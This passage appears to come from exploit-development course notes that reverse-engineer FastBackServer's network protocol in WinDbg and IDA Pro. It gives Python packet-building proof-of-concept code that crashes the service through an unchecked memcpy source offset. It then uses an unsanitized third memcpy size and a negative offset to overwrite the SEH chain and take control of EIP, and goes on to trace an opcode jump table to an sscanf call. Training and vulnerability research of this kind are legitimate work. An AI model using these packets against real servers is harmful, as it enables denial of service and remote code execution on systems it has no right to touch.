    - 0x1C:         Offset for 2nd copy operation
    - 0x20:         Size of 2nd copy operation
    - 0x24:         Offset for 3rd copy operation
    - 0x28:         Size of 3rd copy operation
    - 0x2C - 0x30:  ??
- 0x34 - End:  psCommandBuffer

Inspect execution of the first `memcpy` operation:

```
FastBackServer!FXCLI_OraBR_Exec_Command+0x43b:
0056c8f1 e84aa50f00      call    FastBackServer!memcpy (00666e40)
```

`dd esp L3`

```
0d6de328  0d733b30 486c8d4d 00001000
```

`dd 486c8d4d`

```
486c8d4d  ???????? ???????? ???????? ????????
486c8d5d  ???????? ???????? ???????? ????????
486c8d6d  ???????? ???????? ???????? ????????
486c8d7d  ???????? ???????? ???????? ????????
486c8d8d  ???????? ???????? ???????? ????????
486c8d9d  ???????? ???????? ???????? ????????
486c8dad  ???????? ???????? ???????? ????????
486c8dbd  ???????? ???????? ???????? ????????
```

`p`

```
(158.1b54): Access violation - code c0000005 (first chance)
FastBackServer!memcpy+0x33:
00666e73 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
```

Notice that the DWORD at offset `0x14` in the `psAgentCommand` buffer, which has the value `0x41414141`, will cause the `memcpy` operation to have an invalid source buffer.

This eventually leads to an invalid address and an access violation when executing the `memcpy`.

We have just found our 1st vulnerability in the application before we even finish examining the protocol. Unfortunately, `memcpy` with an invalid source buffer will only cause a DoS and not enable us to obtain EIP control.

While a DoS vulnerability can be useful in some situations, we want to RCE.

### Exploiting Memcpy

We learned how to trigger an access violation and crash `FastBackServer`.

Uncover a vulnerability that will provide us with full control of `EIP`.

An updated packet structure based on this information:

- 0x00       : Checksum DWORD
- 0x04 - 0x30: psAgentCommand
    - 0x04 - 0x10:  ??
    - 0x14:         Offset for 1st copy operation
    - 0x18:         Size of 1st copy operation
    - 0x1C:         Offset for 2nd copy operation
    - 0x20:         Size of 2nd copy operation
    - 0x24:         Offset for 3rd copy operation
    - 0x28:         Size of 3rd copy operation
    - 0x2C - 0x30:  ??
- 0x34 - End:  psCommandBuffer

Update our PoC to reflect the structure of the `psAgentCommand` buffer and populate it with values that will not cause an access violation.

```python
import socket
import sys
from struct import pack

# Checksum
buf = pack(">i", 0x630)
# psAgentCommand
buf += bytearray([0x41]*0x10)
buf += pack("<i", 0x0)    # 1st memcpy: offset
buf += pack("<i", 0x100)  # 1st memcpy: size field
buf += pack("<i", 0x100)  # 2nd memcpy: offset
buf += pack("<i", 0x200)  # 2nd memcpy: size field
buf += pack("<i", 0x300)  # 3rd memcpy: offset
buf += pack("<i", 0x300)  # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)

# psCommandBuffer
buf += bytearray([0x42]*0x100) # 1st buffer
buf += bytearray([0x43]*0x200) # 2nd buffer
buf += bytearray([0x44]*0x300) # 3rd buffer
...
```

We have split the `psCommandBuffer` into 3 parts with sizes of `0x100`, `0x200`, and `0x300` bytes, respectively.

The `psAgentCommand` buffer is updated to reflect the correct sizes.

The `memcpy` operations are interesting because we control both the `size` parameter and the `source` data, creating optimal conditions for a memory corruption vulnerability.

Set a breakpoint on the first memcpy call in WinDbg and resend our PoC:

`bp FastBackServer!FXCLI_OraBR_Exec_Command+0x43b`

`g`

```
Breakpoint 0 hit
FastBackServer!FXCLI_OraBR_Exec_Command+0x43b:
0056c8f1 e84aa50f00      call    FastBackServer!memcpy (00666e40)
```

`dd esp L3`

```
0d4be328  0d513b30 06e9ec0c 00000100
```

`dd 06e9ec0c`

```
06e9ec0c  42424242 42424242 42424242 42424242
06e9ec1c  42424242 42424242 42424242 42424242
06e9ec2c  42424242 42424242 42424242 42424242
06e9ec3c  42424242 42424242 42424242 42424242
06e9ec4c  42424242 42424242 42424242 42424242
06e9ec5c  42424242 42424242 42424242 42424242
06e9ec6c  42424242 42424242 42424242 42424242
06e9ec7c  42424242 42424242 42424242 42424242
```

The 2nd argument is our `psCommandBuffer` and the 3rd argument is the buffer length that we supply. However, the 1st argument, the destination buffer, is not under our control.

In a typical stack overflow vulnerability, a user-supplied buffer is copied onto the stack and overwrites the return address with a controlled value.

To succeed, 2 conditions need to be satisfied.

1. The destination buffer needs to reside on the stack at an address lower than the **return address**. (If the destination buffer is at a higher address than where the return address is stored, the return address will never be overwritten.)

2. Ensure that the size of the copy is large enough to overwrite the return address.

To check for the first condition, compare the destination address with the upper- and lower-bounds of the stack.

`dd esp L3`

```
0d4be328  0d513b30 06e9ec0c 00000100
```

`!teb`

```
TEB at 0031e000
    ExceptionList:        0d51ff38
    StackBase:            0d520000
    StackLimit:           0d4be000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
...
```

From the `StackLimit` and `StackBase` result, the destination buffer resides on the current thread stack.

Next, check if the destination buffer is located at a lower address than the storage address of the target return address we want to overwrite.

Identify the target function **return address** by dumping the call stack

`k`

```
 # ChildEBP RetAddr  
00 0d51fe98 0056a21f FastBackServer!FXCLI_OraBR_Exec_Command+0x43b
01 0d51feb4 00581366 FastBackServer!FXCLI_C_ReceiveCommand+0x130
02 0d51fef0 0048ca98 FastBackServer!FX_AGENT_Cyclic+0x116
03 0d51ff48 006693e9 FastBackServer!ORABR_Thread+0xef
04 0d51ff80 76449564 FastBackServer!_beginthreadex+0xf4
05 0d51ff94 772d293c KERNEL32!BaseThreadInitThunk+0x24
06 0d51ffdc 772d2910 ntdll!__RtlUserThreadStart+0x2b
07 0d51ffec 00000000 ntdll!_RtlUserThreadStart+0x1b
```

Locate the **return address storage address**:

`dds 0d51fe98 L2`

```
0d51fe98  0d51feb4
0d51fe9c  0056a21f FastBackServer!FXCLI_C_ReceiveCommand+0x130
```

`? 0d513b30 < 0d51fe9c`

```
Evaluate expression: 1 = 00000001
```

=> A return address overwrite is possible if we can copy enough data on the stack.

Calculating the difference between the destination buffer and the return address

`? 0d51fe9c  - 0d513b30`

```
Evaluate expression: 50028 = 0000c36c
```

=> We must copy `0xC36C` bytes or more to overwrite the return address, but the maximum value for the `size` parameter in the 1st `memcpy` is set to `0x61A8` bytes.

=> It will not be possible to create a stack buffer overflow condition.

A buffer overflow condition is also not possible for the 2nd `memcpy` operation.
 
For the 3rd `memcpy` operation, the size of the copy is supposed to be specified at offset `0x14` (offset `0x18` from the beginning of the packet).

However, we find that the value compared to the maximum copy size value is at offset `0x4`. This value was used to sanitize the size of the 1st `memcpy` too and it appears to be a **programming mistake**.
 
Additionally, revisiting the basic block that performs the `memcpy` operation:

```nasm
mov     ecx, [ebp+psAgentCommand_0x10]
mov     edx, [ecx+14h]
push    edx             ; Size
mov     eax, [ebp+psAgentCommand_0x10]
mov     ecx, [ebp+psCommandBuffer]
add     ecx, [eax+10h]
push    ecx             ; Src
lea     edx, [ebp+Source]
push    edx             ; Dst
call    _memcpy
add     esp, 0Ch
mov     eax, [ebp+psAgentCommand_0x10]
mov     ecx, [eax+14h]
mov     [ebp+ecx+Source], 0
```

We find that it uses the size given for the 3rd buffer in `psAgentCommand` as expected

Since the sanitization is applied using the wrong header buffer size, there is no restriction put in place for the size of this third memory copy operation.

This `memcpy` uses our input data and an unsanitized size, making the perfect conditions for a stack buffer overflow.

Single stepping to the 3rd `memcpy` operation.

```
FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7:
0056c97d e8bea40f00      call    FastBackServer!memcpy (00666e40)
```

`dd esp L3`

```
0d4be328  0d50d980 06e9ef0c 00000300
```

`k`

```
 # ChildEBP RetAddr  
00 0d51fe98 0056a21f FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7
01 0d51feb4 00581366 FastBackServer!FXCLI_C_ReceiveCommand+0x130
02 0d51fef0 0048ca98 FastBackServer!FX_AGENT_Cyclic+0x116
03 0d51ff48 006693e9 FastBackServer!ORABR_Thread+0xef
04 0d51ff80 76449564 FastBackServer!_beginthreadex+0xf4
05 0d51ff94 772d293c KERNEL32!BaseThreadInitThunk+0x24
06 0d51ffdc 772d2910 ntdll!__RtlUserThreadStart+0x2b
07 0d51ffec 00000000 ntdll!_RtlUserThreadStart+0x1b
```

`dds 0d51fe98 L2`

```
0d51fe98  0d51feb4
0d51fe9c  0056a21f FastBackServer!FXCLI_C_ReceiveCommand+0x130
```

`? 0d51fe9c - 0d50d980`

```
Evaluate expression: 75036 = 0001251c
```

We need a copy size greater than `0x1251C` bytes to overwrite the return address. However, the maximum packet size is `0x4400` bytes.

It's possible to fragment the TCP packets to send more than `0x4400` bytes, but this won't be necessary to exploit this vulnerability.

No checks are ever performed on the **offset** values.

=> supply any value we choose, even if it causes the source buffer address to point outside the `psCommandBuffer`.

If we supply a **negative offset**, the copy operation will use a source buffer address lower than the `psCommandBuffer` one. This copy operation will succeed as long as the memory dereferenced during the copy is allocated.

### Getting EIP Control

We located a programming error in the application that enables us to trigger a `memcpy` operation with an **unsanitized size value**.

Overwrite the target return address by precisely calculating the required offset and size for the overflow.

However, a huge buffer length is required for a successful overflow => we would likely corrupt pointers on the stack that will be used by the target function before returning into the overwritten return address.

=> Even if a direct EIP overwrite is possible, it would require a lot of work.

Perform an even larger copy and attempt to **overwrite the SEH chain** and trigger an exception by writing beyond the end of the stack.

Crafting the third part of the `psCommandBuffer`:

- After a few tests, we found that a `psCommandBuffer` size of `0x2000` bytes is sufficient to overflow the SEH chain with our data.

- For the 1st and 2nd buffers, use a size of `0x1000` bytes to reach the 3rd `memcpy` call, passing the 3 size sanity checks.

- Set the offset values to `0x0` for the first 2 `memcpy` operations to avoid invalid dereferences and DoS conditions.

- Set the 3rd size parameter in the `psAgentCommand` buffer to `0x13000` to trigger the overflow condition (The `size` needs > `0x1251C` bytes).

- To address the issue of the maximum packet size of `0x4400` bytes,  supply a **negative value** for the 3rd offset in the `psAgentCommand` buffer.

- If we supply the value `-0x11000`, the `memcpy` operation will first copy the `0x11000` bytes of memory preceding our `psCommandBuffer`, followed by the first `0x2000` bytes contained in `psCommandBuffer`.

Our updated PoC:

```python
import socket
import sys
from struct import pack

# Checksum
buf = pack(">i", 0x2330)
# psAgentCommand
buf += bytearray([0x41]*0x10)
buf += pack("<i", 0x0)     # 1st memcpy: offset
buf += pack("<i", 0x1000)  # 1st memcpy: size field
buf += pack("<i", 0x0)     # 2nd memcpy: offset
buf += pack("<i", 0x1000)  # 2nd memcpy: size field
buf += pack("<i", -0x11000)  # 3rd memcpy: offset
buf += pack("<i", 0x13000) # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)

# psCommandBuffer
buf += bytearray([0x45]*0x100) # 1st buffer
buf += bytearray([0x45]*0x200) # 2nd buffer
buf += bytearray([0x45]*0x2000) # 3rd buffer
...
```

Restarting FastBackServer, attaching WinDbg, and setting a breakpoint on the third `memcpy` at `FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7`.

`bp FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7`

`g`

```
Breakpoint 0 hit
FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7:
0056c97d e8bea40f00      call    FastBackServer!memcpy (00666e40)
```

`dd esp L3`

```
0d21e328  0d26d980 06f01c0c 00013000
```

`dd 06f01c0c`

```
06f01c0c  00000000 00000000 00000000 00000000
06f01c1c  00000000 00000000 00000000 00000000
06f01c2c  00000000 00000000 00000000 00000000
06f01c3c  00000000 00000000 00000000 00000000
06f01c4c  00000000 00000000 00000000 00000000
06f01c5c  00000000 00000000 00000000 00000000
06f01c6c  00000000 00000000 00000000 00000000
06f01c7c  00000000 00000000 00000000 00000000
```

`dd 06f01c0c + 11000`

```
06f12c0c  45454545 45454545 45454545 45454545
06f12c1c  45454545 45454545 45454545 45454545
06f12c2c  45454545 45454545 45454545 45454545
06f12c3c  45454545 45454545 45454545 45454545
06f12c4c  45454545 45454545 45454545 45454545
06f12c5c  45454545 45454545 45454545 45454545
06f12c6c  45454545 45454545 45454545 45454545
06f12c7c  45454545 45454545 45454545 45454545
```

The source buffer contains null bytes, but at offset `0x11000` into the source buffer, we find our expected `0x45` bytes.

Before stepping over the call to `memcpy`, examine the structured exception handler chain:

`!exchain`

```
0d27ff38: FastBackServer!_except_handler3+0 (00667de4)
  CRT scope  1, filter: FastBackServer!ORABR_Thread+fb (0048caa4)
                func:   FastBackServer!ORABR_Thread+10d (0048cab6)
0d27ff70: FastBackServer!_except_handler3+0 (00667de4)
  CRT scope  0, filter: FastBackServer!_beginthreadex+112 (00669407)
                func:   FastBackServer!_beginthreadex+126 (0066941b)
0d27ffcc: ntdll!_except_handler4+0 (77307390)
  CRT scope  0, filter: ntdll!__RtlUserThreadStart+40 (772d2951)
                func:   ntdll!__RtlUserThreadStart+7c (772d298d)
0d27ffe4: ntdll!FinalExceptionHandlerPad54+0 (77313c86)
Invalid exception stack at ffffffff
```

The SEH chain is complete and valid, as expected.

Step over the `memcpy` operation and dump the SEH chain again:

`p`

```
(8d8.e90): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=06f14c0c ebx=05feade0 ecx=00000260 edx=00000000 esi=06f1428c edi=0d280000
eip=00666e73 esp=0d21e318 ebp=0d21e320 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010212
FastBackServer!memcpy+0x33:
00666e73 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
```

`!exchain`

```
0d27ff38: 45454545
Invalid exception stack at 45454545
```

The SEH chain has been overwritten with our data, `0x45454545`.

An access violation has also been triggered, enabling us to invoke the compromised SEH chain by continuing execution.

`g`

```
(8d8.e90): Access violation - code c0000005 (first chance)
45454545 ??              ???
```

We have obtained control of the `EIP`.

## Digging Deeper to Find More Bugs

We located a vulnerability that gives us control of the `EIP` register. 

But keep focusing on reverse engineering to locate another vulnerability.

Dig into the target program's main functionality that can be reached through `FastBackServer!FXCLI_OraBR_Exec_Command`.

Uncover an additional memory corruption through a different type of memory copy operation.

### Switching Execution

Revert our PoC to contain valid values in the `psAgentCommand` buffer, to **avoid** triggering the unsanitized `memcpy` operation vulnerabilities found:

```python
import socket
import sys
from struct import pack

# Checksum
buf = pack(">i", 0x630)
# psAgentCommand
buf += bytearray([0x41]*0x10)
buf += pack("<i", 0x0)    # 1st memcpy: offset
buf += pack("<i", 0x100)  # 1st memcpy: size field
buf += pack("<i", 0x100)  # 2nd memcpy: offset
buf += pack("<i", 0x200)  # 2nd memcpy: size field
buf += pack("<i", 0x300)  # 3rd memcpy: offset
buf += pack("<i", 0x300)  # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)

# psCommandBuffer
buf += bytearray([0x42]*0x100) # 1st buffer
buf += bytearray([0x43]*0x200) # 2nd buffer
buf += bytearray([0x44]*0x300) # 3rd buffer
...
```

Because of the access violation triggered, restart `FastBackServer`, set a breakpoint just before the 1st `memcpy` at `FastBackServer!FXCLI_OraBR_Exec_Command+0x43b`, and execute our PoC:

`bp FastBackServer!FXCLI_OraBR_Exec_Command+0x43b`

`g`

```
Breakpoint 0 hit
FastBackServer!FXCLI_OraBR_Exec_Command+0x43b:
0056c8f1 e84aa50f00      call    FastBackServer!memcpy (00666e40)
```

`dd esp L3`

```
0d2ee328  0d343b30 071d6c0c 00000100
```

`dd 071d6c0c`

```
071d6c0c  42424242 42424242 42424242 42424242
071d6c1c  42424242 42424242 42424242 42424242
071d6c2c  42424242 42424242 42424242 42424242
071d6c3c  42424242 42424242 42424242 42424242
071d6c4c  42424242 42424242 42424242 42424242
071d6c5c  42424242 42424242 42424242 42424242
071d6c6c  42424242 42424242 42424242 42424242
071d6c7c  42424242 42424242 42424242 42424242
```

Step over the 3 `memcpy` calls without triggering any exception:

```
FastBackServer!FXCLI_OraBR_Exec_Command+0x481:
0056c937 e804a50f00      call    FastBackServer!memcpy (00666e40)
```

`dd poi(esp+4)`

```
071d6d0c  43434343 43434343 43434343 43434343
071d6d1c  43434343 43434343 43434343 43434343
071d6d2c  43434343 43434343 43434343 43434343
071d6d3c  43434343 43434343 43434343 43434343
071d6d4c  43434343 43434343 43434343 43434343
071d6d5c  43434343 43434343 43434343 43434343
071d6d6c  43434343 43434343 43434343 43434343
071d6d7c  43434343 43434343 43434343 43434343
...
```

```
FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7:
0056c97d e8bea40f00      call    FastBackServer!memcpy (00666e40)
```

`dd poi(esp+4)`

```
071d6f0c  44444444 44444444 44444444 44444444
071d6f1c  44444444 44444444 44444444 44444444
071d6f2c  44444444 44444444 44444444 44444444
071d6f3c  44444444 44444444 44444444 44444444
071d6f4c  44444444 44444444 44444444 44444444
071d6f5c  44444444 44444444 44444444 44444444
071d6f6c  44444444 44444444 44444444 44444444
071d6f7c  44444444 44444444 44444444 44444444
```

After the last `memcpy`, we reach an interesting basic block:

```nasm
mov     byte ptr [ebp+ecx-12518h],0
mov dword ptr [ebp-1251Ch],0
mov     edx,dword ptr [ebp-0C370h]
cmp     dword ptr [edx+0Ch],1090h
jz      FastBackServer!FXCLI_OraBR_Exec_Command+0x69d (0056cb53)
```

Single-stepping to the instruction (`cmp dword ptr [edx+0Ch],1090h`) in WinDbg:

```
0056c9a6 817a0c90100000  cmp     dword ptr [edx+0Ch],1090h ds:0023:05f1c88c=41414141
```

`dd edx`

```
05f1c880  41414141 41414141 04edf020 41414141
05f1c890  00000000 00000100 00000100 00000200
05f1c8a0  00000300 00000300 41414141 071d6c08
05f1c8b0  14b8f413 081d9b71 4c435846 534d5f49
05f1c8c0  00005147 00000000 00000000 00000000
05f1c8d0  00000000 00000000 00000000 00000000
05f1c8e0  00000000 00000000 00000000 00000000
05f1c8f0  00000000 00000000 00000000 00000000
```

The `EDX` register points to the beginning of our header.

The DWORD used for the comparison is located at offset `0x0C` from `psAgentCommand`.

Follow the chain of basic blocks:

```nasm
mov     [ebp+var_1251C], 0
mov     edx, [ebp+psAgentCommand]
cmp     dword ptr [edx+0Ch], 1090h
jz      loc_56CB53
mov     eax, [ebp+psAgentCommand]
cmp     dword ptr [eax+0Ch], 903h
jz      loc_56CB53
mov     ecx, [ebp+psAgentCommand]
cmp     dword ptr [ecx+0Ch], 508h
jz      loc_56CB53
mov     edx, [ebp+psAgentCommand]
cmp     dword ptr [edx+0Ch], 1070h
jz      loc_56CB53
mov     eax, [ebp+psAgentCommand]
cmp     dword ptr [eax+0Ch], 514h
jz      loc_56CB53
mov     ecx, [ebp+psAgentCommand]
cmp     dword ptr [ecx+0Ch], 521h
jz      loc_56CB53
mov     edx, [ebp+psAgentCommand]
cmp     dword ptr [edx+0Ch], 1104h
jz      loc_56CB53
mov     eax, [ebp+psAgentCommand]
cmp     dword ptr [eax+0Ch], 1000h
jz      loc_56CB53
```

These comparisons all use the same DWORD to determine the execution flow.

We typically find code like this after the application finishes parsing the network protocol, then enabling us to **choose which functionality** to trigger within the target service.

Follow the execution further down to `0x56CB53` in IDA Pro:
 
```nasm
mov     eax, [ebp+psAgentCommand]
mov     ecx, [eax+0Ch]
mov     [ebp+var_61B30], ecx
cmp     [ebp+var_61B30], 1016h
jg      loc_56CF6C
```

This block initiates the first of a series of comparisons between our controlled DWORD and all the application's valid opcodes.

Follow one of these comparisons for opcode `0x500`:

```nasm
cmp     [ebp+var_61B30], 500h
jz      loc_56DD33
```
 
In short, we can use the opcode DWORD to reach a good chunk of the `FastBackServer` functionality. This opens up the possibility to explore new execution paths and discover new vulnerabilities.

Updating the layout of the packet to reflect the results of our analysis:

- 0x00       : Checksum DWORD
- 0x04 -> 0x30: psAgentCommand
  - 0x04 -> 0xC:  Not used
  - 0x10:         Opcode
  - 0x14:         Offset for 1st copy operation
  - 0x18:         Size of 1st copy operation
  - 0x1C:         Offset for 2nd copy operation
  - 0x20:         Size of 2nd copy operation
  - 0x24:         Offset for 3rd copy operation
  - 0x28:         Size of 3rd copy operation
  - 0x2C -> 0x30: Not used
- 0x34 -> End:  psCommandBuffer
  - 0x34 + offset1 -> 0x34 + offset1 + size1: 1st buffer
  - 0x34 + offset2 -> 0x34 + offset2 + size2: 2nd buffer
  - 0x34 + offset3 -> 0x34 + offset3 + size3: 3rd buffer


### Going Down `0x534`

We have reached the main branching location inside `FXCLI_OraBR_Exec_Command`.

When searching for vulnerabilities, differentiate between memory corruption vulnerabilities and logical vulnerabilities:

- **Memory corruption** vulnerabilities will commonly occur during copy or move operations like `memcpy`, `memmov`, or `strcpy`, as well as operations like `sscanf`.

- **Logical** vulnerabilities typically come down to implemented functions exposing a security risk, such as command injection or the ability to upload an executable file.

To locate all vulnerabilities exposed by `FastBackServer!FXCLI_OraBR_Exec_Command`, examine the execution path associated with every opcode.

We would typically approach this methodically by starting at the **lowest possible opcode** and moving upwards.

Investigate a single function associated with opcode `0x534`.

Update our PoC to contain 3 buffers of different size and a valid `psAgentCommand` buffer containing an opcode with a value set to `0x534`.

We're choosing to investigate the execution path associated with this opcode because it contains a vulnerability that we will fully exploit in later modules.

```python
import socket
import sys
from struct import pack

# Checksum
buf = pack(">i", 0x630)
# psAgentCommand
buf += bytearray([0x41]*0xC)
buf += pack("<i", 0x534)  # opcode
buf += pack("<i", 0x0)    # 1st memcpy: offset
buf += pack("<i", 0x100)  # 1st memcpy: size field
buf += pack("<i", 0x100)  # 2nd memcpy: offset
buf += pack("<i", 0x200)  # 2nd memcpy: size field
buf += pack("<i", 0x300)  # 3rd memcpy: offset
buf += pack("<i", 0x300)  # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)

# psCommandBuffer
buf += bytearray([0x42]*0x100) # 1st buffer
buf += bytearray([0x43]*0x200) # 2nd buffer
buf += bytearray([0x44]*0x300) # 3rd buffer
...
```

Trace the updated packet by restarting FastBackServer and placing a breakpoint on the 1st opcode comparison at `FXCLI_OraBR_Exec_Command+0x6ac`.

`bp FastBackServer!FXCLI_OraBR_Exec_Command+0x6ac`

`g`

```
Breakpoint 0 hit
FastBackServer!FXCLI_OraBR_Exec_Command+0x6ac:
0056cb62 81bdd0e4f9ff16100000 cmp dword ptr [ebp-61B30h],1016h ss:0023:0dafe368=00000534
```

`u eip L10`

```
FastBackServer!FXCLI_OraBR_Exec_Command+0x6ac:
0056cb62 81bdd0e4f9ff16100000 cmp dword ptr [ebp-61B30h],1016h
0056cb6c 0f8ffa030000    jg      FastBackServer!FXCLI_OraBR_Exec_Command+0xab6 (0056cf6c)
0056cb72 81bdd0e4f9ff16100000 cmp dword ptr [ebp-61B30h],1016h
0056cb7c 0f846a650000    je      FastBackServer!FXCLI_OraBR_Exec_Command+0x6c36 (005730ec)
0056cb82 81bdd0e4f9ff54050000 cmp dword ptr [ebp-61B30h],554h
0056cb8c 0f8fb4010000    jg      FastBackServer!FXCLI_OraBR_Exec_Command+0x890 (0056cd46)
0056cb92 81bdd0e4f9ff54050000 cmp dword ptr [ebp-61B30h],554h
0056cb9c 0f84c3320000    je      FastBackServer!FXCLI_OraBR_Exec_Command+0x39af (0056fe65)
0056cba2 81bdd0e4f9ff17050000 cmp dword ptr [ebp-61B30h],517h
0056cbac 0f8f60010000    jg      FastBackServer!FXCLI_OraBR_Exec_Command+0x85c (0056cd12)
0056cbb2 81bdd0e4f9ff17050000 cmp dword ptr [ebp-61B30h],517h
0056cbbc 0f84512e0000    je      FastBackServer!FXCLI_OraBR_Exec_Command+0x355d (0056fa13)
0056cbc2 81bdd0e4f9ff01050000 cmp dword ptr [ebp-61B30h],501h
0056cbcc 0f8f0c010000    jg      FastBackServer!FXCLI_OraBR_Exec_Command+0x828 (0056ccde)
0056cbd2 81bdd0e4f9ff01050000 cmp dword ptr [ebp-61B30h],501h
0056cbdc 0f8470110000    je      FastBackServer!FXCLI_OraBR_Exec_Command+0x189c (0056dd52)
```

We now face a list of subsequent comparisons against the supplied opcode.

By single-stepping through the instructions, we reach the following basic block where the program code subtracts `0x518` from the supplied opcode.
 
```nasm
mov     edx, [ebp+var_61B30]
sub     edx, 518h
mov     [ebp+var_61B30], edx
cmp     [ebp+var_61B30], 3Bh ; switch 60 cases
ja      loc_575A55      ; jumptable 0056CD0B default case
```

The result of this operation (`0x534 - 0x518 = 0x1C`) is compared against the `0x3B` value. 

Since `0x1C` < `0x3B`, the jump at the end of the basic block is not taken and we arrive at the switch condition:
 
```nasm
mov     ecx, [ebp+var_61B30]
xor     eax, eax
mov     al, ds:byte_575F6E[ecx]
jmp     ds:off_575F06[eax*4] ; switch jump
```

- The set of instructions copies the result (`0x1C`) into `ECX`.

- This register is then used as an index into a byte array starting at address `0x575F6E`, to fetch a single byte into `AL`.

- The value in `AL` is multiplied by `0x4` and used as an index into the array starting at address `0x575F06`.

- The retrieved pointer from the array will be the address where execution is transferred to, through the jump instruction (`0x56CD3F`).

The assembly code in the basic block analyzed above is commonly referred to as a **jump table** or branch table.

```
FastBackServer!FXCLI_OraBR_Exec_Command+0x87b:
0056cd31 8b8dd0e4f9ff    mov     ecx,dword ptr [ebp-61B30h] ss:0023:0dafe368=0000001c
```

`p`

```
ecx=0000001c
FastBackServer!FXCLI_OraBR_Exec_Command+0x881:
0056cd37 33c0            xor     eax,eax
```

`p`

```
eax=00000000 ecx=0000001c
FastBackServer!FXCLI_OraBR_Exec_Command+0x883:
0056cd39 8a816e5f5700    mov     al,byte ptr FastBackServer!FXCLI_OraBR_Exec_Command+0x9ab8 (00575f6e)[ecx] ds:0023:00575f8a=10
```

`db 00575f6e+1c L1`

```
00575f8a  10                                               .
```

`p`

```
eax=00000010
FastBackServer!FXCLI_OraBR_Exec_Command+0x889:
0056cd3f ff2485065f5700  jmp     dword ptr FastBackServer!FXCLI_OraBR_Exec_Command+0x9a50 (00575f06)[eax*4] ds:0023:00575f46=00572e27
```

`dd 00575f06+10*4 L1`

```
00575f46  00572e27
```

`p`

```
FastBackServer!FXCLI_OraBR_Exec_Command+0x6971:
00572e27 668b85acdafeff  mov     ax,word ptr [ebp-12554h] ss:0023:0db4d944=1a8e
```

After the execution of the jumptable, we arrive at address `0x572e27` in `FXCLI_OraBR_Exec_Command`.

Let's align IDA Pro with our dynamic analysis at address `0x572e27`, and we'll find the next basic block demonstrated below.

```nasm
mov     ax, [ebp+var_12554] ; jumptable 0056CD3F case 28
push    eax             ; int
mov     ecx, dword ptr [ebp+var_12558]
push    ecx             ; char
lea     edx, [ebp+var_C36C]
push    edx             ; int
lea     eax, [ebp+Source]
push    eax             ; void *
lea     ecx, [ebp+Dst]
push    ecx             ; Src
mov     edx, [ebp+psAgentCommand_0x10]
push    edx             ; int
call    _FXCLI_SetConfFileChunk
add     esp, 18h
```
 
The main task of this basic block is to set up arguments for the call to `FXCLI_SetConfFileChunk`.

If we single-step to the call instruction in WinDbg and dump the arguments for the call, we will find the `psAgentCommand` buffer, along with the 1st and 3rd buffer from the `psCommandBuffer`:

```
FastBackServer!FXCLI_OraBR_Exec_Command+0x699c:
00572e52 e8b45e0000      call    FastBackServer!FXCLI_SetConfFileChunk (00578d0b)
```

`dd esp L6`

```
0dafe31c  0602c890 0db53b30 0db4d980 0db53b2c
0dafe32c  90b0a8c0 00001a8e
```

`dd 0602c890`

```
0602c890  00000000 00000100 00000100 00000200
0602c8a0  00000300 00000300 41414141 06ff1c08
0602c8b0  9b7083b6 081d6f84 4c435846 534d5f49
0602c8c0  00005147 00000000 00000000 00000000
0602c8d0  00000000 00000000 00000000 00000000
0602c8e0  00000000 00000000 00000000 00000000
0602c8f0  00000000 00000000 00000000 00000000
0602c900  00000000 00000000 00000000 00000000
```

`dd 0db53b30`

```
0db53b30  42424242 42424242 42424242 42424242
0db53b40  42424242 42424242 42424242 42424242
0db53b50  42424242 42424242 42424242 42424242
0db53b60  42424242 42424242 42424242 42424242
0db53b70  42424242 42424242 42424242 42424242
0db53b80  42424242 42424242 42424242 42424242
0db53b90  42424242 42424242 42424242 42424242
0db53ba0  42424242 42424242 42424242 42424242
```

`dd 0db4d980`

```
0db4d980  44444444 44444444 44444444 44444444
0db4d990  44444444 44444444 44444444 44444444
0db4d9a0  44444444 44444444 44444444 44444444
0db4d9b0  44444444 44444444 44444444 44444444
0db4d9c0  44444444 44444444 44444444 44444444
0db4d9d0  44444444 44444444 44444444 44444444
0db4d9e0  44444444 44444444 44444444 44444444
0db4d9f0  44444444 44444444 44444444 44444444
```

Examining the `FXCLI_SetConfFileChunk` function, we find a call to `sscanf`.

This function is interesting because, depending on its input arguments, it can produce a **memory corruption vulnerability**.
 
```nasm
lea     eax, [ebp+var_8]
push    eax
lea     ecx, [ebp+var_C]
push    ecx
lea     edx, [ebp+var_318]
push    edx
lea     eax, [ebp+var_4]
push    eax
lea     ecx, [ebp+Str1]
push    ecx
push    offset $SG128695 ; "File: %s From: %d To: %d ChunkLoc: %d F"...
mov     edx, [ebp+Src]
push    edx             ; Src
call    _sscanf
add     esp, 1Ch
```

`sscanf` function prototype:

```C
int sscanf(const char *buffer, const char *format, ... );
```

The 1st argument (`*buffer`) is the source buffer.

The 2nd argument (`*format`) is a format string specifier, which decides how the source buffer is interpreted.

Depending on the format string specifier, the source buffer is split and copied into the optional argument buffers given as "...":

Single step up to the call and dump the arguments from the stack:

```
FastBackServer!FXCLI_SetConfFileChunk+0x40:
00578d4b e8d5e70e00      call    FastBackServer!sscanf (00667525)
```

`dd esp L7`

```
0dafdbc0  0db53b30 0085b0dc 0dafe204 0dafe310
0dafdbd0  0dafdffc 0dafe308 0dafe30c
```

`dd 0db53b30`

```
0db53b30  42424242 42424242 42424242 42424242
0db53b40  42424242 42424242 42424242 42424242
0db53b50  42424242 42424242 42424242 42424242
0db53b60  42424242 42424242 42424242 42424242
0db53b70  42424242 42424242 42424242 42424242
0db53b80  42424242 42424242 42424242 42424242
0db53b90  42424242 42424242 42424242 42424242
0db53ba0  42424242 42424242 42424242 42424242
```

`da 0085b0dc`

```
0085b0dc  "File: %s From: %d To: %d ChunkLo"
0085b0fc  "c: %d FileLoc: %d"
```

